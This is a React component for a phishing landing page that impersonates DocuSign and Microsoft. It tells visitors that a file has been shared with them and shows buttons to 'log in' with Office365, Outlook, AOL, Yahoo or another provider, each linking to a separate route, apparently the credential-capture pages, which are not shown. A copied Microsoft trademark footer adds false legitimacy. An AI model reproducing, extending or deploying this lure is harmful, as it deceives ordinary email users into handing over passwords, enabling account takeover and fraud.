import React from "react";
import { Link } from "react-router-dom";
import "./home.css"; // Ensure that 'home.css' is the correct path to your CSS file.

const Home = () => {
  return (
    <div className="bg-black text-white h-screen flex flex-col justify-center items-center">
      <div className="video-background">
        <iframe
          src="https://www.youtube.com/embed/Pzho4G1beqM?autoplay=1&controls=0&showinfo=0&autohide=1&loop=1&mute=1&playlist=Pzho4G1beqM"
          frameBorder="0"
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
          allowFullScreen
          title="Background Video"
        ></iframe>
      </div>

      <div className="min-h-screen flex flex-col items-center justify-center px-4 content z-10">
        <div className="max-w-md w-full space-y-8">
          <div className="text-center">
            <h2 className="mt-6 text-3xl font-extrabold">
              Welcome to DocuSign
            </h2>
            <p className="mt-2 text-sm">
              Your contact has shared a file with you.
            </p>
            <p className="mt-2 text-sm">
              Save your files to Adobe PDF and get them from any device,
              anywhere
            </p>
            <p className="mt-5 text-xs">
              Select any of the options below to view and download the file
            </p>
          </div>

          <div className="mt-8 space-y-6">
            <Link
              to="/office"
              className="group w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-opacity-50 transition duration-150 ease-in-out"
            >
              Login with Office365
            </Link>
            <Link
              to="/outlook"
              className="group w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50 transition duration-150 ease-in-out"
            >
              Login with Outlook
            </Link>
            <Link
              to="/others"
              className="group w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-500 hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-50 transition duration-150 ease-in-out"
            >
              Login with Other
            </Link>
            <Link
              to="/aol"
              className="group w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-400 hover:bg-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-300 focus:ring-opacity-50 transition duration-150 ease-in-out"
            >
              Login with AOL
            </Link>
            <Link
              to="/yahoo"
              className="group w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-300 hover:bg-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-200 focus:ring-opacity-50 transition duration-150 ease-in-out"
            >
              Login with Yahoo
            </Link>
          </div>

          <div className="mt-6 text-center text-xs">
            <p>
              Office365, Outlook, SharePoint, OneDrive, Skype, OneNote,
              PowerPoint, Word, Excel are all trademarks of Microsoft. All
              rights reserved © Microsoft 2024.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;
